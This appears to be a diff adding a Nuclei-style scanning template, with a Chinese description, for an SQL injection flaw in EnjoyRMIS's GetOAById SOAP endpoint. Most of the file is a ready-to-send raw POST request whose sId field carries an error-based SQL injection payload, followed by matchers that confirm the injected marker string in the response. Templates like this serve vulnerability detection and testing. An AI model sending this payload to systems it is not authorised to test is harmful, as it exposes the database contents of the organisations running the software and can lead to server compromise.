@@ -1,0 +1,42 @@
+id: ajERP-CWSHr-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: EnjoyRMIS GetOAById存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/main/EnjoyRMIS-GetOAById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /EnjoyRMIS_WS/WS/Hr/CWSHr.asmx HTTP/1.1
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        SOAPAction: http://tempuri.org/GetOAById
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+        Content-Length: 552
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetOAById xmlns="http://tempuri.org/">
+              <sId>string' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>
+            </GetOAById>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qqqzq1qvkqq'
+      - type: word
+        part: header
+        words:
+          - '500'
